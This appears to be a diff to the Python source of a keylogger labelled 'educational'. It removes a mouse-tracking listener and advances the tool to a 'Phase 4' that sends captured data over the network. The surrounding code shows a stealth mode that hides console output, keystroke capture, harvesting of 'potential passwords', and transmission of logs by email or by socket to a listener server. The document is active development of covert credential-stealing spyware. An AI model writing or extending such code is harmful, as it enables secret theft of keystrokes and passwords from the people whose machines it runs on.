@@ -68,9 +68,6 @@ class KeyLogger:
         self.network_port = network_port
         self.network_socket = None  # Persistent connection
         self.network_connected = False
-        
-        # Mouse listener for cursor position tracking
-        self.mouse_listener = None
 
         # Initialize email transmitter if enabled
         if self.enable_transmission and EMAIL_AVAILABLE:
@@ -821,7 +818,7 @@ Potential Passwords Found: {len(self.potential_passwords)}
         else:
             # Normal mode: full console output
             print("="*60)
-            print("EDUCATIONAL KEYLOGGER - PHASE 3 (Stealth Capable)")
+            print("EDUCATIONAL KEYLOGGER - PHASE 4 (Network Transmission)")
             print("="*60)
             print(f"Started at: {self.get_timestamp()}")
             print(f"Raw logs: {self.current_log_file}")
@@ -830,12 +827,9 @@ Potential Passwords Found: {len(self.potential_passwords)}
             print("="*60)
             print("\nCapturing keystrokes:\n")
 
-        # Start mouse listener if network transmission is enabled
-        if self.enable_network and self.network_connected:
-            self.mouse_listener = mouse.Listener(on_click=self.on_mouse_click)
-            self.mouse_listener.start()
-            if not self.stealth_mode:
-                print("[INFO] Mouse tracking enabled for cursor position detection")
+        # NOTE: Mouse listener removed due to pynput.mouse bug on Windows
+        # The listener server will display navigation keys (arrows, backspace, etc.)
+        # as markers for better understanding of user actions
 
         # Start listening to keyboard events
         try:
@@ -849,10 +843,6 @@ Potential Passwords Found: {len(self.potential_passwords)}
             self._write_session_footer()
             if not self.stealth_mode:
                 print("\n\n[KEYLOGGER STOPPED BY INTERRUPT]")
-        finally:
-            # Stop mouse listener if it was started
-            if self.mouse_listener:
-                self.mouse_listener.stop()
 
         if not self.stealth_mode:
             print(f"\n\nStopped at: {self.get_timestamp()}")
